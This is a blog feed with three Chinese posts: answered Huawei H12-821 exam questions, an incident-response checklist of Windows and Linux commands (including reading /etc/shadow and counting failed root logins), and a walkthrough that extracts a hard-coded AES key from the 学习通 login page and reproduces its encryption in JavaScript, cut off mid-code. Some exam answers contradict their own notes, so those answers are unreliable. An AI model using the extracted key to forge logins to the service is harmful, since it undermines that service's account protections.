class="line">本路由器的区域号为49.0001</span><br><span class="line">D</span><br><span class="line">本路由器System-lD为0100.0000.1001</span><br><span class="line"></span><br><span class="line">笔记：答案是B</span><br><span class="line">display isis lsdb verbose命令输出信息描</span><br><span class="line">述，图中信息显示：SOURCE表示本路由器system ID；NLPID 表示支持网络协议IPv4；NBR ID邻居系统system ID; AREA ADDR 区域号。</span><br></pre></td></tr></table></figure><h2 id="如下图所示，防火墙收到从PC1到PC2报文，则以下说法正确的是？"><a href="#如下图所示，防火墙收到从PC1到PC2报文，则以下说法正确的是？" class="headerlink" title="如下图所示，防火墙收到从PC1到PC2报文，则以下说法正确的是？"></a>如下图所示，防火墙收到从PC1到PC2报文，则以下说法正确的是？</h2><p><img src="/H12-821/12.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">该报文无法匹配安全策略rule1、rule2,将会匹配防火墙的默认策略，防火墙会转发该报文</span><br><span class="line">B</span><br><span class="line">防火墙的默认安全策略为匹配所有，动作为拒绝</span><br><span class="line">C</span><br><span class="line">该报文会匹配安全策略rule2,防火墙会转发该报文</span><br><span class="line">D</span><br><span class="line">该报文会匹配安全策略rule1</span><br><span class="line"></span><br><span class="line">笔记：答案是C</span><br><span class="line">策略中rule 1源是trust,目的是dmz；rule 2源为trust，目的未定义表示任意，PC1到PC2是从trust区域到untrust区域，所以该报文匹配rule2，因为动作是允许，所以防火墙会转发该报文</span><br></pre></td></tr></table></figure><h2 id="如图所示是一个IP报文头部，则以下说法正确的是？"><a href="#如图所示是一个IP报文头部，则以下说法正确的是？" class="headerlink" title="如图所示是一个IP报文头部，则以下说法正确的是？"></a>如图所示是一个IP报文头部，则以下说法正确的是？</h2><p><img src="/H12-821/13.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">协议号51，代表该IP Header后的报文为AH头部</span><br><span class="line">B</span><br><span class="line">该报文一定是只有AH封装的IPsec VPN报文</span><br><span class="line">C</span><br><span class="line">协议号51，代表该IP Header后的报文为ESP头部</span><br><span class="line">D</span><br><span class="line">该报文为Ipsec VPN报文，并且该报文的数据部分被加密了</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是C</span><br><span class="line">AH流量(IP协议号为51)、 ESP流量(IP协议号为50)</span><br></pre></td></tr></table></figure><h2 id="下面是路由器Huawei的部分输出信息，关于输出信息，描述错误的是"><a href="#下面是路由器Huawei的部分输出信息，关于输出信息，描述错误的是" class="headerlink" title="下面是路由器Huawei的部分输出信息，关于输出信息，描述错误的是"></a>下面是路由器Huawei的部分输出信息，关于输出信息，描述错误的是</h2><p><img src="/H12-821/14.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">该路由器gigabitethernet 1/0/0接口运行的PIM-SM</span><br><span class="line">B</span><br><span class="line">该路由器gigabitethernet1/0/0接口运行的PIM状态是UP的</span><br><span class="line">C</span><br><span class="line">该路由器gigabitethernet 1/0/0接☐运行的是PIMv2</span><br><span class="line">D</span><br><span class="line">该接口上的DR是10.1.1.1</span><br><span class="line"></span><br><span class="line">笔记：答案是D</span><br><span class="line">A和C不冲突，A是协议，C是协议对应的版本，按图中该接口上的DR应该是10.1.1.2</span><br></pre></td></tr></table></figure><h2 id="四台路由运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，下列说法中正确的是？"><a href="#四台路由运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，下列说法中正确的是？" class="headerlink" title="四台路由运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，下列说法中正确的是？"></a>四台路由运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，下列说法中正确的是？</h2><p><img src="/H12-821/15.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">R1路由器的LSDB中不存在R4的LSP</span><br><span class="line">B</span><br><span class="line">R2路由器的LSDB中不存在R3的LSP</span><br><span class="line">C</span><br><span class="line">R3路由器的LSDB中不存在R4的LSP</span><br><span class="line">D</span><br><span class="line">R2路由器的LSDB中不存在R4的LSP</span><br><span class="line"></span><br><span class="line">笔记：答案是A</span><br><span class="line">Level-1路由器负责区域内的路由，只负责维护Level-1的链路状态数据库LSDB且只包含本区域的路由信息。</span><br></pre></td></tr></table></figure><h2 id="四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，在R3设备上配置路由渗透，则R4到10-0-2-2-x2F-32的Cost值为多少？"><a href="#四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，在R3设备上配置路由渗透，则R4到10-0-2-2-x2F-32的Cost值为多少？" class="headerlink" title="四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，在R3设备上配置路由渗透，则R4到10.0.2.2&#x2F;32的Cost值为多少？"></a>四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，在R3设备上配置路由渗透，则R4到10.0.2.2&#x2F;32的Cost值为多少？</h2><p><img src="/H12-821/16.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">40</span><br><span class="line">B</span><br><span class="line">50</span><br><span class="line">C</span><br><span class="line">80</span><br><span class="line">D</span><br><span class="line">30</span><br><span class="line"></span><br><span class="line">答案是B</span><br><span class="line">配置了路由渗透，R4上有R2到10.0.2.2的明细路由，因此走的是R4-&gt;R3-&gt;R2即40+10=50</span><br></pre></td></tr></table></figure><h2 id="四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，则R4到达10-0-2-2-x2F-32的cost值为多少？"><a href="#四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，则R4到达10-0-2-2-x2F-32的cost值为多少？" class="headerlink" title="四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，则R4到达10.0.2.2&#x2F;32的cost值为多少？"></a>四台路由器运行IS-IS且已经建立邻接关系，区域号和路由器的等级如图中标记，则R4到达10.0.2.2&#x2F;32的cost值为多少？</h2><p><img src="/H12-821/17.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">40</span><br><span class="line">B</span><br><span class="line">10</span><br><span class="line">C</span><br><span class="line">20</span><br><span class="line">D</span><br><span class="line">30</span><br><span class="line"></span><br><span class="line">笔记：答案是D</span><br><span class="line">由于没有配置路由渗透，所以R4会选择离自己最近的一个路由器生成缺省并指定其为下一跳路由，该题中R4认为R1离它最近，所以是30</span><br></pre></td></tr></table></figure><h2 id="某台路由器运行IS-IS-其输出信息如图所示，下列说法正确的是？"><a href="#某台路由器运行IS-IS-其输出信息如图所示，下列说法正确的是？" class="headerlink" title="某台路由器运行IS-IS,其输出信息如图所示，下列说法正确的是？"></a>某台路由器运行IS-IS,其输出信息如图所示，下列说法正确的是？</h2><p><img src="/H12-821/18.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">s4/0/0接口发送IIH的周期为30s</span><br><span class="line">B</span><br><span class="line">s4/0/0接口的circuit-level为Level-1</span><br><span class="line">C</span><br><span class="line">s4/0/0接口的Cost值为20</span><br><span class="line">D</span><br><span class="line">s4/0/0接口支持IPv6</span><br><span class="line"></span><br><span class="line">笔记：答案是B</span><br><span class="line">S4/0/0接口的发送IIH的周期是10s，cost值为10，接口不支持IPv6，因为IPv6接口状态是down</span><br></pre></td></tr></table></figure><h2 id="如图所示的网络，R1设备配置路由渗透，那么R1设备把Level-2的LSP发送给R3-使R3可以获知全网路由。"><a href="#如图所示的网络，R1设备配置路由渗透，那么R1设备把Level-2的LSP发送给R3-使R3可以获知全网路由。" class="headerlink" title="如图所示的网络，R1设备配置路由渗透，那么R1设备把Level-2的LSP发送给R3,使R3可以获知全网路由。"></a>如图所示的网络，R1设备配置路由渗透，那么R1设备把Level-2的LSP发送给R3,使R3可以获知全网路由。</h2><p><img src="/H12-821/19.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">正确</span><br><span class="line">B</span><br><span class="line">错误</span><br><span class="line"></span><br><span class="line">笔记：答案是B</span><br><span class="line">R1配置路由渗透，R1设备把Level-2的LSP发送给R4</span><br></pre></td></tr></table></figure><h2 id="如图所示，同一局域网中的四台路由器运行IS-IS，其中R1是DIS。则R2、R3、R4分别和R1建立邻接关系，R2、R3、R4之间不建立邻接关系。"><a href="#如图所示，同一局域网中的四台路由器运行IS-IS，其中R1是DIS。则R2、R3、R4分别和R1建立邻接关系，R2、R3、R4之间不建立邻接关系。" class="headerlink" title="如图所示，同一局域网中的四台路由器运行IS-IS，其中R1是DIS。则R2、R3、R4分别和R1建立邻接关系，R2、R3、R4之间不建立邻接关系。"></a>如图所示，同一局域网中的四台路由器运行IS-IS，其中R1是DIS。则R2、R3、R4分别和R1建立邻接关系，R2、R3、R4之间不建立邻接关系。</h2><p><img src="/H12-821/20.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">正确</span><br><span class="line">B</span><br><span class="line">错误</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B</span><br><span class="line">在广播类型网络中，IS-IS在同一网段上的同一级别的路由器之间都会形成邻接关系，包括所有的非DIS路由器之间也会形成邻接关系</span><br></pre></td></tr></table></figure><h2 id="下面是路由器RTB的部分输出信息，关于输出信息描述错误的是"><a href="#下面是路由器RTB的部分输出信息，关于输出信息描述错误的是" class="headerlink" title="下面是路由器RTB的部分输出信息，关于输出信息描述错误的是"></a>下面是路由器RTB的部分输出信息，关于输出信息描述错误的是</h2><p><img src="/H12-821/21.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">最后发送Report消息的主机是225.1.1.2</span><br><span class="line">B</span><br><span class="line">接口上动态加入的组播组个数是1</span><br><span class="line">C</span><br><span class="line">display igmp group命令用来查看IGMP组播信息，包括通过成员报告动态加入的组播组和通过命令行静态加入的组播组信息</span><br><span class="line">D</span><br><span class="line">加入的组播地址是225.1.1.2</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A</span><br><span class="line">图中显示last reporter 地址10.1.6.10。</span><br></pre></td></tr></table></figure><h2 id="下面一台路由器的输出信息，关于这段信息描述正确的是"><a href="#下面一台路由器的输出信息，关于这段信息描述正确的是" class="headerlink" title="下面一台路由器的输出信息，关于这段信息描述正确的是"></a>下面一台路由器的输出信息，关于这段信息描述正确的是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">该路由到达目标网络5.1.1.0/24的MED值为50</span><br><span class="line">B</span><br><span class="line">该路由到达目标网络1.1.1.0/24的MED值是100</span><br><span class="line">C</span><br><span class="line">该路由到达目标网络5.1.1.0/24的下一跳是1.1.1.1，且该路由是最优的</span><br><span class="line">D</span><br><span class="line">该路由到达目标网络1.1.1.0/24的下一跳是1.1.1.1，且该路由是最优的</span><br><span class="line"></span><br><span class="line">笔记：答案是C</span><br><span class="line">该路由到达目标网段的MED都是0，因为到达5.1.1.1的路由前有&gt;,代表的是最优路由</span><br></pre></td></tr></table></figure><h2 id="关于OSPF特性描述错误的是："><a href="#关于OSPF特性描述错误的是：" class="headerlink" title="关于OSPF特性描述错误的是："></a>关于OSPF特性描述错误的是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">OSPF 采用链路状态算法。</span><br><span class="line">B</span><br><span class="line">每个路由器通过泛洪 LSA 向外发布本地链路状态信息</span><br><span class="line">C</span><br><span class="line">每台 OSPF 设备都会收集其它路由器发来的 LSA，所有的 LSA放在一起便组成了链路状态数据库 LSDB</span><br><span class="line">D</span><br><span class="line">OSPF 区域0中所有路由器的 LSDB 都相同。</span><br><span class="line">E</span><br><span class="line">每台路由器根据有向图，使用 SPF 算法计算出一棵以自己为根的最短路径树，这棵树给出了到自治系统中各节点的路由</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">D 错误，OSPF 区域0中所有路由器的 LSDB 不一定相同，因为每个路由器可能与其它路由器建立了不同的邻居关系，收到的 LSA 也可能不同，从而导致 LSDB 不同。</span><br></pre></td></tr></table></figure><h2 id="通过路由策略设置路由的-Community-属性，是否会影响路由选路？"><a href="#通过路由策略设置路由的-Community-属性，是否会影响路由选路？" class="headerlink" title="通过路由策略设置路由的 Community 属性，是否会影响路由选路？"></a>通过路由策略设置路由的 Community 属性，是否会影响路由选路？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">可以间接影响，通过设置路由的Community属性可以将路由分类，然后根据类别设置不同的路由选路相关的属性，比如LocalPre、MED等，从而达到影响路由选择的目的</span><br><span class="line">B</span><br><span class="line">无法影响，因为路由的Community属性是非过渡属性，不能在路由器间传递</span><br><span class="line">C</span><br><span class="line">可以间接影响，通过设置路由的Community属性可以将路由分类，然后根据类别设置不同的路由选路相关的属性，这些属性只能包括LocalPre、MED从而达到影响路由选路的目的。</span><br><span class="line">D</span><br><span class="line">路由器收到Community属性为No_Advertise的路由更新后，不会发布到本地AS之外</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">A 正确，通过设置路由的 Community 属性可以将路由分类，然后根据类别设置不同的路由选路相关的属性，如 Local Preference、MED 等，从而影响路由的选路。 Community 属性是可传递的，可以在路由器之间传递。而选路的影响主要体现在 BGP 中，因为在 BGP 中，路由的选路依赖于各种属性，如 AS_Path、Local Preference、MED 等。在 BGP 中，可以通过设置 Community 属性来影响这些属性的取值，从而影响 BGP 路由的选路</span><br></pre></td></tr></table></figure><h2 id="下面关于OSPF报文验证描述错误的是："><a href="#下面关于OSPF报文验证描述错误的是：" class="headerlink" title="下面关于OSPF报文验证描述错误的是："></a>下面关于OSPF报文验证描述错误的是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">AR2200支特的验证模式按加密算法不同分为null、simple、MD5以及HMAC-MD5.</span><br><span class="line">B</span><br><span class="line">AR2200支持两种认证方式：区域验证和接口验证</span><br><span class="line">C</span><br><span class="line">当区域验证方式和接口验证方式同时存在时，优先使用区域验证</span><br><span class="line">D</span><br><span class="line">只有通过验证的OSPF报文才能接受，否则将不能正常建立邻居</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是C，当区域验证方式和接口验证方式同时存在时，优先使用接口验证。区域验证只在没有配置接口验证时才会生效。</span><br></pre></td></tr></table></figure><h2 id="策略路由-policy-based-route-不支持根据下列哪种策略来指定数据包转发的路径？"><a href="#策略路由-policy-based-route-不支持根据下列哪种策略来指定数据包转发的路径？" class="headerlink" title="策略路由(policy-based-route)不支持根据下列哪种策略来指定数据包转发的路径？"></a>策略路由(policy-based-route)不支持根据下列哪种策略来指定数据包转发的路径？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">源地址</span><br><span class="line">B</span><br><span class="line">目的地址</span><br><span class="line">C</span><br><span class="line">源MAC</span><br><span class="line">D</span><br><span class="line">报文长度</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">D。策略路由支持基于源地址、目的地址、源端口、目的端口、协议等多种策略来指定数据包转发的路径，但不支持基于报文长度来指定数据包转发的路径。</span><br></pre></td></tr></table></figure><h2 id="能够定义组有公共性质的目的地址的BGP属性是："><a href="#能够定义组有公共性质的目的地址的BGP属性是：" class="headerlink" title="能够定义组有公共性质的目的地址的BGP属性是："></a>能够定义组有公共性质的目的地址的BGP属性是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">Origin</span><br><span class="line">B</span><br><span class="line">Community</span><br><span class="line">C</span><br><span class="line">AS_PATH</span><br><span class="line">D</span><br><span class="line">MED</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">B。能够定义组有公共性质的目的地址的BGP属性是Community属性。Community属性是一个可选非传递性属性，可以用来标识一组IP地址的公共性质。它可以用来实现路由的过滤、属性的修改等功能。Origin属性表示路由的起源，AS_PATH属性表示AS路径，MED属性表示AS之间的度量值。</span><br></pre></td></tr></table></figure><h2 id="关于链路聚合的基本概念，下面描述错误的是："><a href="#关于链路聚合的基本概念，下面描述错误的是：" class="headerlink" title="关于链路聚合的基本概念，下面描述错误的是："></a>关于链路聚合的基本概念，下面描述错误的是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">链路聚合是将一组物理接口捆绑在起作为一个逻辑接口来增加带宽及可靠性的方法。</span><br><span class="line">B</span><br><span class="line">链路聚合遵循IEEE802.3ad协议。</span><br><span class="line">C</span><br><span class="line">将若干条物理链路捆绑在一起所形成的逻辑链路称之为链路聚合组(LAG)或者Trunk.</span><br><span class="line">D</span><br><span class="line">链路聚合只存在活动接口</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">D。链路聚合存在两种接口类型：主动接口和备用接口。主动接口用来传输数据，备用接口则在主动接口故障时接管主动接口的工作。因此，链路聚合中不仅存在活动接口，也存在备用接口。因此描述D是错误的。</span><br></pre></td></tr></table></figure><h2 id="华为交换机提供配置端口隔离的功能，关于端口隔离描述错误的有："><a href="#华为交换机提供配置端口隔离的功能，关于端口隔离描述错误的有：" class="headerlink" title="华为交换机提供配置端口隔离的功能，关于端口隔离描述错误的有："></a>华为交换机提供配置端口隔离的功能，关于端口隔离描述错误的有：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">端口隔离模式可以配置为二层三层都隔离或者二层隔离三层互通</span><br><span class="line">B</span><br><span class="line">华为交换机支持64个隔离组，编号为0-63.</span><br><span class="line">C</span><br><span class="line">若在接口A上配置它与接口B隔离，则从接口A发送的报文不能到达接口B但从接口B发送的报文可以到达接口A</span><br><span class="line">D</span><br><span class="line">接口单向隔离支持</span><br><span class="line">E</span><br><span class="line">GE、XGE和Eth-Trunk三种类型的接口混合隔离，但不支持接口与自身单向隔离、接口与管理网口单向隔高、Eth-Trunk与自身成员接口单向隔离</span><br><span class="line"></span><br><span class="line">笔记：答案是B</span><br><span class="line">为了实现报文之间的二层隔离，用户可以将不同的端口加入不同的VLAN，但这样会浪费有限的VLAN资源。采用端口隔离功能，可以实现同一VLAN内端口之间的隔离。用户只需要将端口加入到隔离组中，就可以实现隔离组内端口之间二层数据的隔离。端口隔离功能为用户提供了更安全、更灵活的组网方案。</span><br><span class="line">如果用户希望隔离同一VLAN内的广播报文，但是不同端口下的用户还可以进行三层通信，则可以将隔离模式设置为二层隔离三层互通；如果用户希望同一VLAN不同端口下用户彻底无法通信，则可以将隔离模式配置为二层三层均隔离即可。</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]port-isolate enable group ?</span><br><span class="line">INTEGER&lt;1-64&gt; Port isolate group-id //华为交换机默认最多支持64个端口隔离组，编号为1-64</span><br><span class="line">配置视图</span><br><span class="line">接口单向隔离支持不同类型的接口混合隔离，但不支持接口与自身单向隔离、接口与管理网口单向隔离、Eth-Trunk与自身成员接口单向隔离。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;以下关于OSPF协议说法错误的是？&quot;&gt;&lt;a href=&quot;#以下关于OSPF协议说法错误的是？&quot; class=&quot;headerlink&quot; title=&quot;以下关于OSPF协议说法错误的是？&quot;&gt;&lt;/a&gt;以下关于OSPF协议说法错误的是？&lt;/h2&gt;&lt;figure class</summary>
      
    
    
    
    
    <category term="HUAWEI" scheme="https://jielunya.github.io/tags/HUAWEI/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之系统排查</title>
    <link href="https://jielunya.github.io/2023/01/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5/"/>
    <id>https://jielunya.github.io/2023/01/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5/</id>
    <published>2023-01-21T06:46:03.000Z</published>
    <updated>2023-01-21T07:24:58.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a><code>Windows系统</code></h1><h2 id="查看本地用户和组"><a href="#查看本地用户和组" class="headerlink" title="查看本地用户和组"></a>查看本地用户和组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通用户：win+r 输入lusrmgr.msc</span><br><span class="line">隐藏用户：win+r 输入regedit查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</span><br></pre></td></tr></table></figure><h2 id="系统日志分析"><a href="#系统日志分析" class="headerlink" title="系统日志分析"></a>系统日志分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入eventvwr.msc 查看windows日志</span><br></pre></td></tr></table></figure><h2 id="网络与端口分析"><a href="#网络与端口分析" class="headerlink" title="网络与端口分析"></a>网络与端口分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入netstat -ano 查看活动连接</span><br></pre></td></tr></table></figure><h2 id="恶意进程分析"><a href="#恶意进程分析" class="headerlink" title="恶意进程分析"></a>恶意进程分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入tasklist 查看进程列表</span><br></pre></td></tr></table></figure><h2 id="自启动分析"><a href="#自启动分析" class="headerlink" title="自启动分析"></a>自启动分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入msconfig 查看自启动服务</span><br></pre></td></tr></table></figure><h2 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入schtasks</span><br></pre></td></tr></table></figure><h2 id="分析最近打开的文件"><a href="#分析最近打开的文件" class="headerlink" title="分析最近打开的文件"></a>分析最近打开的文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+r 输入%UserProfile%\Recent</span><br></pre></td></tr></table></figure><h1 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a><code>Linux系统</code></h1><h2 id="历史执行命令记录"><a href="#历史执行命令记录" class="headerlink" title="历史执行命令记录"></a>历史执行命令记录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure><h2 id="检查定时任务"><a href="#检查定时任务" class="headerlink" title="检查定时任务"></a>检查定时任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /etc/cron*</span><br></pre></td></tr></table></figure><h2 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd # 查看用户信息文件</span><br><span class="line">cat /etc/shadow # 查看影子文件</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">cat /etc/passwd | grep x:0</span><br><span class="line"># 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户</span><br></pre></td></tr></table></figure><h2 id="查看登录以及重启记录"><a href="#查看登录以及重启记录" class="headerlink" title="查看登录以及重启记录"></a>查看登录以及重启记录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure><h2 id="网络与端口分析-1"><a href="#网络与端口分析-1" class="headerlink" title="网络与端口分析"></a>网络与端口分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -alntp</span><br></pre></td></tr></table></figure><h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br><span class="line"></span><br><span class="line">top #按b可根据内存使用情况排序</span><br><span class="line"></span><br><span class="line">top -p pid #监控指定程序</span><br></pre></td></tr></table></figure><h2 id="查看自启程序"><a href="#查看自启程序" class="headerlink" title="查看自启程序"></a>查看自启程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files | grep enabled</span><br></pre></td></tr></table></figure><h2 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h2><p>统计爆破主机root账号的失败次数及ip：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>查看成功登录的日期、用户名、IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows系统&quot;&gt;&lt;a href=&quot;#Windows系统&quot; class=&quot;headerlink&quot; title=&quot;Windows系统&quot;&gt;&lt;/a&gt;&lt;code&gt;Windows系统&lt;/code&gt;&lt;/h1&gt;&lt;h2 id=&quot;查看本地用户和组&quot;&gt;&lt;a href=&quot;#查看本地</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
    <category term="windows" scheme="https://jielunya.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>记一次学习通登录逆向</title>
    <link href="https://jielunya.github.io/2023/01/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91/"/>
    <id>https://jielunya.github.io/2023/01/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91/</id>
    <published>2023-01-14T07:34:03.000Z</published>
    <updated>2023-01-14T13:30:19.012Z</updated>
    
    <content type="html"><![CDATA[<blockquote>打开浏览器，进入学习通登录页面。F12——随便输入账号密码点击登录——网络——fanyalogin–负载，这里发现uname和password使用了加密手段进行加密。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/1.png"></p><blockquote>尝试搜索password了解使用什么加密手段。</blockquote><blockquote>这里找到了一个encryptByAES()函数，看起来像是加密方式，第一个参数为密码，第二个参数为密钥。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/2.png"></p><blockquote>点击进去，跳转到源代码界面。看到了像是密钥的字符串transferKey = "u2oh6Vu^HWe4_AES"</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/3.png"></p><blockquote>为了验证密钥是否真实，再次搜索encryptByAES，找到它加密的方法。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/4.png"></p><blockquote>同样点进去，在加密方法的返回值return处下个断点。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/5.png"></p><blockquote>点击登录，发现已经断下来了，F9，单步走。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/6.png"><br><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/7.png"></p><blockquote>到这已经证实了猜想。下面复现一下它的加密过程，将encryptByAES的方法复制到在线js运行工具里调试。在原来的基础上加上一句代码调用它的方法，console.log(encryptByAES('123','u2oh6Vu^HWe4_AES'));</blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encryptByAES</span>(<span class="params">message, key</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">CBCOptions</span> = &#123;</span><br><span class="line"><span class="attr">iv</span>: <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(key),</span><br><span class="line"><span class="attr">mode</span>:<span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line"><span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> aeskey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(key);</span><br><span class="line"><span class="keyword">let</span> secretData = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(message);</span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(</span><br><span class="line">secretData,</span><br><span class="line">aeskey,</span><br><span class="line"><span class="title class_">CBCOptions</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(encrypted.<span class="property">ciphertext</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title 